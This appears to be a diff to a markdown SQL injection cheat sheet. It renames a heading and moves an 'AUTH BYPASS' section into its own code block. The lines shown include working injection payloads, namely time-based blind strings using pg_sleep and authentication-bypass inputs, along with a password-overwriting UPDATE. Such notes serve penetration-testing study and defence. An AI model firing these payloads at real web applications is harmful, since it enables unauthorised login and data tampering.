@@ -38,7 +38,7 @@ mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
 
 ---
 ## SQLi Payloads
-### SIMPLE
+### QUICK
 
 ```sql
 ';#---              
@@ -73,8 +73,11 @@ administrator'
 '||pg_sleep(10)--
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
--- AUTH BYPASS
+```
 
+### AUTH BYPASS
+
+```SQL
 '-'
 ' '
 '&'
